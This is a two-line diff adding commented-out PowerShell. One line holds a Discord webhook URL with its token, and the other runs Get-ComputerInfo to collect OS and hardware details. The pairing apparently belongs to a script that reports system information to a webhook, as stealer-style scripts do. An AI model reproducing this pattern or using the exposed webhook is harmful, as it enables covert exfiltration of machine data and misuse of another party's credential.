@@ -1,0 +1,2 @@
+#$hookurl = "https://discord.com/api/webhooks/1347912247086813264/Vn9zJgwHRT6kqzNnU7Y73Eg5YH63Dls9ZO-uZYw8cZut1cSzju7e999mdV0vptVYQJ62"
+#Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer, OsBuildLab, CsManufacturer, CsModel, CsProcessors, CsTotalPhysicalMemory | Format-List
